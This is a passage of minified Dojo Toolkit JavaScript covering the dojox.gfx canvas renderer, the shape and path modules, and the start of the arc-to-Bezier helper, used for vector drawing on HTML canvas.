u("dojox.gfx.canvas.Line",[y.Shape,b.Line],{_renderShape:function(a){var f=this.shape;a.beginPath();a.moveTo(f.x1,f.y1);a.lineTo(f.x2,f.y2)},_renderDashedStroke:function(a,c){var f=this.shape;a.beginPath();z(a,this,f.x1,f.y1,f.x2,f.y2);c&&a.stroke()}});y.Polyline=u("dojox.gfx.canvas.Polyline",[y.Shape,b.Polyline],{setShape:function(){this.inherited(arguments);var a=this.shape.points,c=a[0],b,d;this.bbox=null;this._normalizePoints();if(a.length)if("number"==typeof c)c=a;else for(c=[],d=0;d<a.length;++d)b=
a[d],c.push(b.x,b.y);else c=[];this.canvasPolyline=c;return this},_renderShape:function(a){var f=this.canvasPolyline;if(f.length){a.beginPath();a.moveTo(f[0],f[1]);for(var c=2;c<f.length;c+=2)a.lineTo(f[c],f[c+1])}},_renderDashedStroke:function(a,c){var f=this.canvasPolyline,b=0;a.beginPath();for(var d=0;d<f.length;d+=2)b=z(a,this,f[d],f[d+1],f[d+2],f[d+3],b);c&&a.stroke()}});y.Image=u("dojox.gfx.canvas.Image",[y.Shape,b.Image],{setShape:function(){this.inherited(arguments);var a=new Image;this.surface.downloadImage(a,
this.shape.src);this.canvasImage=a;return this},_renderShape:function(a){var f=this.shape;a.drawImage(this.canvasImage,f.x,f.y,f.width,f.height)}});y.Text=u("dojox.gfx.canvas.Text",[y.Shape,b.Text],{_setFont:function(){this.fontStyle?this.canvasFont=e.makeFontString(this.fontStyle):delete this.canvasFont},getTextWidth:function(){var a=this.shape,c=0,b;a.text&&(b=this.surface.rawNode.getContext("2d"),b.save(),this._renderTransform(b),this._renderFill(b,!1),this._renderStroke(b,!1),this.canvasFont&&
(b.font=this.canvasFont),c=b.measureText(a.text).width,b.restore());return c},_render:function(a){a.save();this._renderTransform(a);this._renderFill(a,!1);this._renderStroke(a,!1);this._renderShape(a);a.restore()},_renderShape:function(a){var f=this.shape;f.text&&(a.textAlign="middle"===f.align?"center":f.align,this.canvasFont&&(a.font=this.canvasFont),this.canvasFill&&a.fillText(f.text,f.x,f.y),this.strokeStyle&&(a.beginPath(),a.strokeText(f.text,f.x,f.y),a.closePath()))}});C(y.Text,"setFont");M||
y.Text.extend({getTextWidth:function(){return 0},getBoundingBox:function(){return null},_renderShape:function(){}});var Q={M:"_moveToA",m:"_moveToR",L:"_lineToA",l:"_lineToR",H:"_hLineToA",h:"_hLineToR",V:"_vLineToA",v:"_vLineToR",C:"_curveToA",c:"_curveToR",S:"_smoothCurveToA",s:"_smoothCurveToR",Q:"_qCurveToA",q:"_qCurveToR",T:"_qSmoothCurveToA",t:"_qSmoothCurveToR",A:"_arcTo",a:"_arcTo",Z:"_closePath",z:"_closePath"};y.Path=u("dojox.gfx.canvas.Path",[y.Shape,h.Path],{constructor:function(){this.lastControl=
{}},setShape:function(){this.canvasPath=[];this._dashedPath=[];return this.inherited(arguments)},setStroke:function(){this.inherited(arguments);q||(this.segmented=!1,this._confirmSegmented());return this},_setPath:function(){this._dashResidue=null;this.inherited(arguments)},_updateWithSegment:function(a){var f=n.clone(this.last);this[Q[a.action]](this.canvasPath,a.action,a.args,this._needsDash?this._dashedPath:null);this.last=f;this.inherited(arguments)},_renderShape:function(a){var f=this.canvasPath;
a.beginPath();for(var c=0;c<f.length;c+=2)a[f[c]].apply(a,f[c+1])},_renderDashedStroke:q?function(){}:function(a,c){var f=this._dashedPath;a.beginPath();for(var b=0;b<f.length;b+=2)a[f[b]].apply(a,f[b+1]);c&&a.stroke()},_moveToA:function(a,c,b,d){a.push("moveTo",[b[0],b[1]]);d&&d.push("moveTo",[b[0],b[1]]);for(c=2;c<b.length;c+=2)a.push("lineTo",[b[c],b[c+1]]),d&&(this._dashResidue=z(d,this,b[c-2],b[c-1],b[c],b[c+1],this._dashResidue));this.last.x=b[b.length-2];this.last.y=b[b.length-1];this.lastControl=
{}},_moveToR:function(a,c,b,d){c="x"in this.last?[this.last.x+=b[0],this.last.y+=b[1]]:[this.last.x=b[0],this.last.y=b[1]];a.push("moveTo",c);d&&d.push("moveTo",c);for(c=2;c<b.length;c+=2)a.push("lineTo",[this.last.x+=b[c],this.last.y+=b[c+1]]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],this.last.x,this.last.y,this._dashResidue));this.lastControl={}},_lineToA:function(a,c,b,d){for(c=0;c<b.length;c+=2)d&&(this._dashResidue=z(d,this,this.last.x,this.last.y,b[c],b[c+1],this._dashResidue)),
a.push("lineTo",[b[c],b[c+1]]);this.last.x=b[b.length-2];this.last.y=b[b.length-1];this.lastControl={}},_lineToR:function(a,c,b,d){for(c=0;c<b.length;c+=2)a.push("lineTo",[this.last.x+=b[c],this.last.y+=b[c+1]]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],this.last.x,this.last.y,this._dashResidue));this.lastControl={}},_hLineToA:function(a,c,b,d){for(c=0;c<b.length;++c)a.push("lineTo",[b[c],this.last.y]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],b[c],this.last.y,
this._dashResidue));this.last.x=b[b.length-1];this.lastControl={}},_hLineToR:function(a,c,b,d){for(c=0;c<b.length;++c)a.push("lineTo",[this.last.x+=b[c],this.last.y]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],this.last.x,this.last.y,this._dashResidue));this.lastControl={}},_vLineToA:function(a,c,b,d){for(c=0;c<b.length;++c)a.push("lineTo",[this.last.x,b[c]]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],this.last.x,b[c],this._dashResidue));this.last.y=b[b.length-
1];this.lastControl={}},_vLineToR:function(a,c,b,d){for(c=0;c<b.length;++c)a.push("lineTo",[this.last.x,this.last.y+=b[c]]),d&&(this._dashResidue=z(d,this,d[d.length-1][0],d[d.length-1][1],this.last.x,this.last.y,this._dashResidue));this.lastControl={}},_curveToA:function(a,c,b,d){for(c=0;c<b.length;c+=6)a.push("bezierCurveTo",b.slice(c,c+6)),d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.last.x=b[b.length-2];this.last.y=b[b.length-1];this.lastControl.x=b[b.length-4];this.lastControl.y=
b[b.length-3];this.lastControl.type="C"},_curveToR:function(a,c,b,d){for(c=0;c<b.length;c+=6)a.push("bezierCurveTo",[this.last.x+b[c],this.last.y+b[c+1],this.lastControl.x=this.last.x+b[c+2],this.lastControl.y=this.last.y+b[c+3],this.last.x+b[c+4],this.last.y+b[c+5]]),d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue)),this.last.x+=b[c+4],this.last.y+=b[c+5];this.lastControl.type="C"},_smoothCurveToA:function(a,c,b,d){for(c=0;c<b.length;c+=4){var f="C"==this.lastControl.type;a.push("bezierCurveTo",
[f?2*this.last.x-this.lastControl.x:this.last.x,f?2*this.last.y-this.lastControl.y:this.last.y,b[c],b[c+1],b[c+2],b[c+3]]);d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.lastControl.x=b[c];this.lastControl.y=b[c+1];this.lastControl.type="C"}this.last.x=b[b.length-2];this.last.y=b[b.length-1]},_smoothCurveToR:function(a,c,b,d){for(c=0;c<b.length;c+=4){var f="C"==this.lastControl.type;a.push("bezierCurveTo",[f?2*this.last.x-this.lastControl.x:this.last.x,f?2*this.last.y-this.lastControl.y:
this.last.y,this.last.x+b[c],this.last.y+b[c+1],this.last.x+b[c+2],this.last.y+b[c+3]]);d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.lastControl.x=this.last.x+b[c];this.lastControl.y=this.last.y+b[c+1];this.lastControl.type="C";this.last.x+=b[c+2];this.last.y+=b[c+3]}},_qCurveToA:function(a,c,b,d){for(c=0;c<b.length;c+=4)a.push("quadraticCurveTo",b.slice(c,c+4));d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.last.x=b[b.length-2];this.last.y=b[b.length-
1];this.lastControl.x=b[b.length-4];this.lastControl.y=b[b.length-3];this.lastControl.type="Q"},_qCurveToR:function(a,c,b,d){for(c=0;c<b.length;c+=4)a.push("quadraticCurveTo",[this.lastControl.x=this.last.x+b[c],this.lastControl.y=this.last.y+b[c+1],this.last.x+b[c+2],this.last.y+b[c+3]]),d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue)),this.last.x+=b[c+2],this.last.y+=b[c+3];this.lastControl.type="Q"},_qSmoothCurveToA:function(a,c,b,d){for(c=0;c<b.length;c+=2){var f="Q"==this.lastControl.type;
a.push("quadraticCurveTo",[this.lastControl.x=f?2*this.last.x-this.lastControl.x:this.last.x,this.lastControl.y=f?2*this.last.y-this.lastControl.y:this.last.y,b[c],b[c+1]]);d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.lastControl.type="Q"}this.last.x=b[b.length-2];this.last.y=b[b.length-1]},_qSmoothCurveToR:function(a,c,b,d){for(c=0;c<b.length;c+=2){var f="Q"==this.lastControl.type;a.push("quadraticCurveTo",[this.lastControl.x=f?2*this.last.x-this.lastControl.x:this.last.x,
this.lastControl.y=f?2*this.last.y-this.lastControl.y:this.last.y,this.last.x+b[c],this.last.y+b[c+1]]);d&&(this._dashResidue=D(d,this,a[a.length-1],this._dashResidue));this.lastControl.type="Q";this.last.x+=b[c];this.last.y+=b[c+1]}},_arcTo:function(a,b,d,h){b="a"==b;for(var f=0;f<d.length;f+=7){var g=d[f+5],l=d[f+6];b&&(g+=this.last.x,l+=this.last.y);var e=c.arcAsBezier(this.last,d[f],d[f+1],d[f+2],d[f+3]?1:0,d[f+4]?1:0,g,l);t.forEach(e,function(c){a.push("bezierCurveTo",c)});h&&(this._dashResidue=
D(h,this,p,this._dashResidue));this.last.x=g;this.last.y=l}this.lastControl={}},_closePath:function(a,c,b,d){a.push("closePath",[]);d&&(this._dashResidue=z(d,this,this.last.x,this.last.y,d[1][0],d[1][1],this._dashResidue));this.lastControl={}}});t.forEach("moveTo lineTo hLineTo vLineTo curveTo smoothCurveTo qCurveTo qSmoothCurveTo arcTo closePath".split(" "),function(a){C(y.Path,a)});y.TextPath=u("dojox.gfx.canvas.TextPath",[y.Shape,h.TextPath],{_renderShape:function(a){},_setText:function(){},_setFont:function(){}});
y.Surface=u("dojox.gfx.canvas.Surface",b.Surface,{constructor:function(){b.Container._init.call(this);this.pendingImageCount=0;this.makeDirty()},destroy:function(){b.Container.clear.call(this,!0);this.inherited(arguments)},setDimensions:function(a,c){this.width=e.normalizedLength(a);this.height=e.normalizedLength(c);if(!this.rawNode)return this;a=!1;this.rawNode.width!=this.width&&(this.rawNode.width=this.width,a=!0);this.rawNode.height!=this.height&&(this.rawNode.height=this.height,a=!0);a&&this.makeDirty();
return this},getDimensions:function(){return this.rawNode?{width:this.rawNode.width,height:this.rawNode.height}:null},_render:function(a){!this.rawNode||!a&&this.pendingImageCount||(a=this.rawNode.getContext("2d"),a.clearRect(0,0,this.rawNode.width,this.rawNode.height),this.render(a),"pendingRender"in this&&(clearTimeout(this.pendingRender),delete this.pendingRender))},render:function(a){a.save();for(var c=0;c<this.children.length;++c)this.children[c]._render(a);a.restore()},makeDirty:function(){this.pendingImagesCount||
"pendingRender"in this||this._batch||(this.pendingRender=setTimeout(n.hitch(this,this._render),0))},downloadImage:function(a,c){var b=n.hitch(this,this.onImageLoad);!this.pendingImageCount++&&"pendingRender"in this&&(clearTimeout(this.pendingRender),delete this.pendingRender);a.onload=b;a.onerror=b;a.onabort=b;a.src=c},onImageLoad:function(){--this.pendingImageCount||(this.onImagesLoaded(),this._render())},onImagesLoaded:function(){},getEventSource:function(){return null},connect:function(){},disconnect:function(){},
on:function(){}});y.createSurface=function(a,c,b){if(!c&&!b){var f=r.position(a);c=c||f.w;b=b||f.h}"number"==typeof c&&(c+="px");"number"==typeof b&&(b+="px");f=new y.Surface;a=d.byId(a);var h=a.ownerDocument.createElement("canvas");h.width=e.normalizedLength(c);h.height=e.normalizedLength(b);a.appendChild(h);f.rawNode=h;f._parent=a;return f.surface=f};var L=b.Container;u={openBatch:function(){++this._batch;return this},closeBatch:function(){this._batch=0<this._batch?--this._batch:0;this._makeDirty();
return this},_makeDirty:function(){this._batch||this.surface.makeDirty()},add:function(a){this._makeDirty();return L.add.apply(this,arguments)},remove:function(a,c){this._makeDirty();return L.remove.apply(this,arguments)},clear:function(){this._makeDirty();return L.clear.apply(this,arguments)},getBoundingBox:L.getBoundingBox,_moveChildToFront:function(a){this._makeDirty();return L._moveChildToFront.apply(this,arguments)},_moveChildToBack:function(a){this._makeDirty();return L._moveChildToBack.apply(this,
arguments)}};h={createObject:function(a,c){a=new a;a.surface=this.surface;a.setShape(c);this.add(a);return a}};l(y.Group,u);l(y.Group,b.Creator);l(y.Group,h);l(y.Surface,u);l(y.Surface,b.Creator);l(y.Surface,h);y.fixTarget=function(a,c){return!0};return y})},"dojox/gfx/shape":function(){define("./_base dojo/_base/lang dojo/_base/declare dojo/_base/kernel dojo/_base/sniff dojo/on dojo/_base/array dojo/dom-construct dojo/_base/Color ./matrix".split(" "),function(e,n,t,u,x,r,d,b,h,c){function w(a,c){if(!l)return a.splice(c,
1);var b=a.length;if(b){for(;c<b;)a[c]=a[c+1],c++;a.length--}}var l=!!x("chrome"),k=e.shape={};k.Shape=t("dojox.gfx.shape.Shape",null,{constructor:function(){this.parentMatrix=this.parent=this.bbox=this.strokeStyle=this.fillStyle=this.matrix=this.shape=this.rawNode=null;if(x("gfxRegistry")){var a=k.register(this);this.getUID=function(){return a}}},destroy:function(){x("gfxRegistry")&&k.dispose(this);this.rawNode&&"__gfxObject__"in this.rawNode&&(this.rawNode.__gfxObject__=null);this.rawNode=null},
getNode:function(){return this.rawNode},getShape:function(){return this.shape},getTransform:function(){return this.matrix},getFill:function(){return this.fillStyle},getStroke:function(){return this.strokeStyle},getParent:function(){return this.parent},getBoundingBox:function(){return this.bbox},getTransformedBoundingBox:function(){var a=this.getBoundingBox();if(!a)return null;var b=this._getRealMatrix();return[c.multiplyPoint(b,a.x,a.y),c.multiplyPoint(b,a.x+a.width,a.y),c.multiplyPoint(b,a.x+a.width,
a.y+a.height),c.multiplyPoint(b,a.x,a.y+a.height)]},getEventSource:function(){return this.rawNode},setClip:function(a){this.clip=a},getClip:function(){return this.clip},setShape:function(a){this.shape=e.makeParameters(this.shape,a);this.bbox=null;return this},setFill:function(a){if(!a)return this.fillStyle=null,this;var c=null;if("object"==typeof a&&"type"in a)switch(a.type){case "linear":c=e.makeParameters(e.defaultLinearGradient,a);break;case "radial":c=e.makeParameters(e.defaultRadialGradient,
a);break;case "pattern":c=e.makeParameters(e.defaultPattern,a)}else c=e.normalizeColor(a);this.fillStyle=c;return this},setStroke:function(a){if(!a)return this.strokeStyle=null,this;if("string"==typeof a||n.isArray(a)||a instanceof h)a={color:a};a=this.strokeStyle=e.makeParameters(e.defaultStroke,a);a.color=e.normalizeColor(a.color);return this},setTransform:function(a){this.matrix=c.clone(a?c.normalize(a):c.identity);return this._applyTransform()},_applyTransform:function(){return this},moveToFront:function(){var a=
this.getParent();a&&(a._moveChildToFront(this),this._moveToFront());return this},moveToBack:function(){var a=this.getParent();a&&(a._moveChildToBack(this),this._moveToBack());return this},_moveToFront:function(){},_moveToBack:function(){},applyRightTransform:function(a){return a?this.setTransform([this.matrix,a]):this},applyLeftTransform:function(a){return a?this.setTransform([a,this.matrix]):this},applyTransform:function(a){return a?this.setTransform([this.matrix,a]):this},removeShape:function(a){this.parent&&
this.parent.remove(this,a);return this},_setParent:function(a,c){this.parent=a;return this._updateParentMatrix(c)},_updateParentMatrix:function(a){this.parentMatrix=a?c.clone(a):null;return this._applyTransform()},_getRealMatrix:function(){for(var a=this.matrix,b=this.parent;b;)b.matrix&&(a=c.multiply(b.matrix,a)),b=b.parent;return a}});k._eventsProcessing={on:function(a,c){return r(this.getEventSource(),a,k.fixCallback(this,e.fixTarget,c))},connect:function(a,c,b){"on"==a.substring(0,2)&&(a=a.substring(2));
return this.on(a,b?n.hitch(c,b):c)},disconnect:function(a){return a.remove()}};k.fixCallback=function(a,c,b,d){d||(d=b,b=null);if(n.isString(d)){b=b||u.global;if(!b[d])throw['dojox.gfx.shape.fixCallback: scope["',d,'"] is null (scope\x3d"',b,'")'].join("");return function(h){return c(h,a)?b[d].apply(b,arguments||[]):void 0}}return b?function(h){return c(h,a)?d.apply(b,arguments||[]):void 0}:function(h){return c(h,a)?d.apply(b,arguments):void 0}};n.extend(k.Shape,k._eventsProcessing);k.Container={_init:function(){this.children=
[];this._batch=0},openBatch:function(){return this},closeBatch:function(){return this},add:function(a){var c=a.getParent();c&&c.remove(a,!0);this.children.push(a);return a._setParent(this,this._getRealMatrix())},remove:function(a,c){for(var b=0;b<this.children.length;++b)if(this.children[b]==a){c||(a.parent=null,a.parentMatrix=null);w(this.children,b);break}return this},clear:function(a){for(var c,b=0;b<this.children.length;++b)c=this.children[b],c.parent=null,c.parentMatrix=null,a&&c.destroy();this.children=
[];return this},getBoundingBox:function(){if(this.children){var a=null;d.forEach(this.children,function(b){var d=b.getBoundingBox();d&&((b=b.getTransform())&&(d=c.multiplyRectangle(b,d)),a?(a.x=Math.min(a.x,d.x),a.y=Math.min(a.y,d.y),a.endX=Math.max(a.endX,d.x+d.width),a.endY=Math.max(a.endY,d.y+d.height)):a={x:d.x,y:d.y,endX:d.x+d.width,endY:d.y+d.height})});a&&(a.width=a.endX-a.x,a.height=a.endY-a.y);return a}return null},_moveChildToFront:function(a){for(var c=0;c<this.children.length;++c)if(this.children[c]==
a){w(this.children,c);this.children.push(a);break}return this},_moveChildToBack:function(a){for(var c=0;c<this.children.length;++c)if(this.children[c]==a){w(this.children,c);this.children.unshift(a);break}return this}};k.Surface=t("dojox.gfx.shape.Surface",null,{constructor:function(){this._parent=this.rawNode=null;this._nodes=[];this._events=[]},destroy:function(){d.forEach(this._nodes,b.destroy);this._nodes=[];d.forEach(this._events,function(a){a&&a.remove()});this._events=[];this.rawNode=null;
if(x("ie"))for(;this._parent.lastChild;)b.destroy(this._parent.lastChild);else this._parent.innerHTML="";this._parent=null},getEventSource:function(){return this.rawNode},_getRealMatrix:function(){return null},isLoaded:!0,onLoad:function(a){},whenLoaded:function(a,c){var b=n.hitch(a,c);if(this.isLoaded)b(this);else r.once(this,"load",function(a){b(a)})}});n.extend(k.Surface,k._eventsProcessing);k.Rect=t("dojox.gfx.shape.Rect",k.Shape,{constructor:function(a){this.shape=e.getDefault("Rect");this.rawNode=
a},getBoundingBox:function(){return this.shape}});k.Ellipse=t("dojox.gfx.shape.Ellipse",k.Shape,{constructor:function(a){this.shape=e.getDefault("Ellipse");this.rawNode=a},getBoundingBox:function(){if(!this.bbox){var a=this.shape;this.bbox={x:a.cx-a.rx,y:a.cy-a.ry,width:2*a.rx,height:2*a.ry}}return this.bbox}});k.Circle=t("dojox.gfx.shape.Circle",k.Shape,{constructor:function(a){this.shape=e.getDefault("Circle");this.rawNode=a},getBoundingBox:function(){if(!this.bbox){var a=this.shape;this.bbox={x:a.cx-
a.r,y:a.cy-a.r,width:2*a.r,height:2*a.r}}return this.bbox}});k.Line=t("dojox.gfx.shape.Line",k.Shape,{constructor:function(a){this.shape=e.getDefault("Line");this.rawNode=a},getBoundingBox:function(){if(!this.bbox){var a=this.shape;this.bbox={x:Math.min(a.x1,a.x2),y:Math.min(a.y1,a.y2),width:Math.abs(a.x2-a.x1),height:Math.abs(a.y2-a.y1)}}return this.bbox}});k.Polyline=t("dojox.gfx.shape.Polyline",k.Shape,{constructor:function(a){this.shape=e.getDefault("Polyline");this.rawNode=a},setShape:function(a,
c){a&&a instanceof Array?(this.inherited(arguments,[{points:a}]),c&&this.shape.points.length&&this.shape.points.push(this.shape.points[0])):this.inherited(arguments,[a]);return this},_normalizePoints:function(){var a=this.shape.points,c=a&&a.length;if(c&&"number"==typeof a[0]){for(var b=[],d=0;d<c;d+=2)b.push({x:a[d],y:a[d+1]});this.shape.points=b}},getBoundingBox:function(){if(!this.bbox&&this.shape.points.length){for(var a=this.shape.points,c=a.length,b=a[0],d=b.x,h=b.y,l=b.x,e=b.y,k=1;k<c;++k)b=
a[k],d>b.x&&(d=b.x),l<b.x&&(l=b.x),h>b.y&&(h=b.y),e<b.y&&(e=b.y);this.bbox={x:d,y:h,width:l-d,height:e-h}}return this.bbox}});k.Image=t("dojox.gfx.shape.Image",k.Shape,{constructor:function(a){this.shape=e.getDefault("Image");this.rawNode=a},getBoundingBox:function(){return this.shape},setStroke:function(){return this},setFill:function(){return this}});k.Text=t(k.Shape,{constructor:function(a){this.fontStyle=null;this.shape=e.getDefault("Text");this.rawNode=a},getFont:function(){return this.fontStyle},
setFont:function(a){this.fontStyle="string"==typeof a?e.splitFontString(a):e.makeParameters(e.defaultFont,a);this._setFont();return this},getBoundingBox:function(){var a=null;this.getShape().text&&(a=e._base._computeTextBoundingBox(this));return a}});k.Creator={createShape:function(a){switch(a.type){case e.defaultPath.type:return this.createPath(a);case e.defaultRect.type:return this.createRect(a);case e.defaultCircle.type:return this.createCircle(a);case e.defaultEllipse.type:return this.createEllipse(a);
case e.defaultLine.type:return this.createLine(a);case e.defaultPolyline.type:return this.createPolyline(a);case e.defaultImage.type:return this.createImage(a);case e.defaultText.type:return this.createText(a);case e.defaultTextPath.type:return this.createTextPath(a)}return null},createGroup:function(){return this.createObject(e.Group)},createRect:function(a){return this.createObject(e.Rect,a)},createEllipse:function(a){return this.createObject(e.Ellipse,a)},createCircle:function(a){return this.createObject(e.Circle,
a)},createLine:function(a){return this.createObject(e.Line,a)},createPolyline:function(a){return this.createObject(e.Polyline,a)},createImage:function(a){return this.createObject(e.Image,a)},createText:function(a){return this.createObject(e.Text,a)},createPath:function(a){return this.createObject(e.Path,a)},createTextPath:function(a){return this.createObject(e.TextPath,{}).setText(a)},createObject:function(a,c){return null}};return k})},"dojox/gfx/path":function(){define(["./_base","dojo/_base/lang",
"dojo/_base/declare","./matrix","./shape"],function(e,n,t,u,x){x=t("dojox.gfx.path.Path",x.Shape,{constructor:function(r){this.shape=n.clone(e.defaultPath);this.segments=[];this.tbbox=null;this.absolute=!0;this.last={};this.rawNode=r;this.segmented=!1},setAbsoluteMode:function(e){this._confirmSegmented();this.absolute="string"==typeof e?"absolute"==e:e;return this},getAbsoluteMode:function(){this._confirmSegmented();return this.absolute},getBoundingBox:function(){this._confirmSegmented();return this.bbox&&
"l"in this.bbox?{x:this.bbox.l,y:this.bbox.t,width:this.bbox.r-this.bbox.l,height:this.bbox.b-this.bbox.t}:null},_getRealBBox:function(){this._confirmSegmented();if(this.tbbox)return this.tbbox;var e=this.bbox,d=this._getRealMatrix();this.bbox=null;for(var b=0,h=this.segments.length;b<h;++b)this._updateWithSegment(this.segments[b],d);d=this.bbox;this.bbox=e;return this.tbbox=d?[{x:d.l,y:d.t},{x:d.r,y:d.t},{x:d.r,y:d.b},{x:d.l,y:d.b}]:null},getLastPosition:function(){this._confirmSegmented();return"x"in
this.last?this.last:null},_applyTransform:function(){this.tbbox=null;return this.inherited(arguments)},_updateBBox:function(e,d,b){b&&(d=u.multiplyPoint(b,e,d),e=d.x,d=d.y);this.bbox&&"l"in this.bbox?(this.bbox.l>e&&(this.bbox.l=e),this.bbox.r<e&&(this.bbox.r=e),this.bbox.t>d&&(this.bbox.t=d),this.bbox.b<d&&(this.bbox.b=d)):this.bbox={l:e,b:d,r:e,t:d}},_updateWithSegment:function(r,d){var b=r.args,h=b.length,c;switch(r.action){case "M":case "L":case "C":case "S":case "Q":case "T":for(c=0;c<h;c+=2)this._updateBBox(b[c],
b[c+1],d);this.last.x=b[h-2];this.last.y=b[h-1];this.absolute=!0;break;case "H":for(c=0;c<h;++c)this._updateBBox(b[c],this.last.y,d);this.last.x=b[h-1];this.absolute=!0;break;case "V":for(c=0;c<h;++c)this._updateBBox(this.last.x,b[c],d);this.last.y=b[h-1];this.absolute=!0;break;case "m":c=0;"x"in this.last||(this._updateBBox(this.last.x=b[0],this.last.y=b[1],d),c=2);for(;c<h;c+=2)this._updateBBox(this.last.x+=b[c],this.last.y+=b[c+1],d);this.absolute=!1;break;case "l":case "t":for(c=0;c<h;c+=2)this._updateBBox(this.last.x+=
b[c],this.last.y+=b[c+1],d);this.absolute=!1;break;case "h":for(c=0;c<h;++c)this._updateBBox(this.last.x+=b[c],this.last.y,d);this.absolute=!1;break;case "v":for(c=0;c<h;++c)this._updateBBox(this.last.x,this.last.y+=b[c],d);this.absolute=!1;break;case "c":for(c=0;c<h;c+=6)this._updateBBox(this.last.x+b[c],this.last.y+b[c+1],d),this._updateBBox(this.last.x+b[c+2],this.last.y+b[c+3],d),this._updateBBox(this.last.x+=b[c+4],this.last.y+=b[c+5],d);this.absolute=!1;break;case "s":case "q":for(c=0;c<h;c+=
4)this._updateBBox(this.last.x+b[c],this.last.y+b[c+1],d),this._updateBBox(this.last.x+=b[c+2],this.last.y+=b[c+3],d);this.absolute=!1;break;case "A":for(c=0;c<h;c+=7)this._updateBBox(b[c+5],b[c+6],d);this.last.x=b[h-2];this.last.y=b[h-1];this.absolute=!0;break;case "a":for(c=0;c<h;c+=7)this._updateBBox(this.last.x+=b[c+5],this.last.y+=b[c+6],d);this.absolute=!1}r=[r.action];for(c=0;c<h;++c)r.push(e.formatNumber(b[c],!0));if("string"==typeof this.shape.path)this.shape.path+=r.join("");else for(c=
0,h=r.length;c<h;++c)this.shape.path.push(r[c])},_validSegments:{m:2,l:2,h:1,v:1,c:6,s:4,q:4,t:2,a:7,z:0},_pushSegment:function(e,d){this.tbbox=null;var b=this._validSegments[e.toLowerCase()];"number"==typeof b&&(b?d.length>=b&&(e={action:e,args:d.slice(0,d.length-d.length%b)},this.segments.push(e),this._updateWithSegment(e)):(e={action:e,args:[]},this.segments.push(e),this._updateWithSegment(e)))},_collectArgs:function(e,d){for(var b=0;b<d.length;++b){var h=d[b];"boolean"==typeof h?e.push(h?1:0):
"number"==typeof h?e.push(h):h instanceof Array?this._collectArgs(e,h):"x"in h&&"y"in h&&e.push(h.x,h.y)}},moveTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"M":"m",e);return this},lineTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"L":"l",e);return this},hLineTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?
"H":"h",e);return this},vLineTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"V":"v",e);return this},curveTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"C":"c",e);return this},smoothCurveTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"S":"s",e);return this},qCurveTo:function(){this._confirmSegmented();var e=
[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"Q":"q",e);return this},qSmoothCurveTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"T":"t",e);return this},arcTo:function(){this._confirmSegmented();var e=[];this._collectArgs(e,arguments);this._pushSegment(this.absolute?"A":"a",e);return this},closePath:function(){this._confirmSegmented();this._pushSegment("Z",[]);return this},_confirmSegmented:function(){if(!this.segmented){var e=
this.shape.path;this.shape.path=[];this._setPath(e);this.shape.path=this.shape.path.join("");this.segmented=!0}},_setPath:function(r){r=n.isArray(r)?r:r.match(e.pathSvgRegExp);this.segments=[];this.absolute=!0;this.bbox={};this.last={};if(r){for(var d="",b=[],h=r.length,c=0;c<h;++c){var w=r[c],l=parseFloat(w);isNaN(l)?(d&&this._pushSegment(d,b),b=[],d=w):b.push(l)}this._pushSegment(d,b)}},setShape:function(r){this.inherited(arguments,["string"==typeof r?{path:r}:r]);this.segmented=!1;this.segments=
[];e.lazyPathSegmentation||this._confirmSegmented();return this},_2PI:2*Math.PI});t=t("dojox.gfx.path.TextPath",x,{constructor:function(r){"text"in this||(this.text=n.clone(e.defaultTextPath));"fontStyle"in this||(this.fontStyle=n.clone(e.defaultFont))},getText:function(){return this.text},setText:function(r){this.text=e.makeParameters(this.text,"string"==typeof r?{text:r}:r);this._setText();return this},getFont:function(){return this.fontStyle},setFont:function(r){this.fontStyle="string"==typeof r?
e.splitFontString(r):e.makeParameters(e.defaultFont,r);this._setFont();return this}});return e.path={Path:x,TextPath:t}})},"dojox/gfx/arc":function(){define(["./_base","dojo/_base/lang","./matrix"],function(e,n,t){function u(c){var b=Math.cos(c);c=Math.sin(c);var d={x:b+4/3*(1-b),y:c-4/3*b*(1-b)/c};return{s:{x:b,y:-c},c1:{x:d.x,y:-d.y},c2:d,e:{x:b,y:c}}}var x=2*Math.PI,r=Math.PI/4,d=Math.PI/8,b=r+d,h=u(d);return e.arc={unitArcAsBezier:u,curvePI4:h,arcAsBezier:function(c,e,l,k,a,n,D,z){a=!!a;n=!!n;
var w=t._degToRad(k);k=e*e;var F=l*l,A=t.multiplyPoint(t.rotate(-w),{x:(c.x-D)/2,y:(c.y-z)/2}),B=A.x*A.x,J=A.y*A.y;k=Math.sqrt((k*F-k*J-F*B)/(k*J+F*B));isNaN(k)&&(k=0);k={x:k*e*A.y/l,y:-k*l*A.x/e};a==n&&(k={x:-k.x,y:-k.y});k=t.multiplyPoint([t.translate((c.x+D)/2,(c.y+z)/2),t.rotate(w)],k);e=t.normalize([t.translate(k.x,k.y),t.rotate(w),t.scale(e,l)]);k=t.invert(e);c=t.multiplyPoint(k,c);z=t.multiplyPoint(k,D,z);D=Math.atan2(c.y,c.x);k=D-Math.atan2(z.y,z.x);n&&(k=-k);0>k?k+=x:k>x&&(k-=x);l=d;z=h;
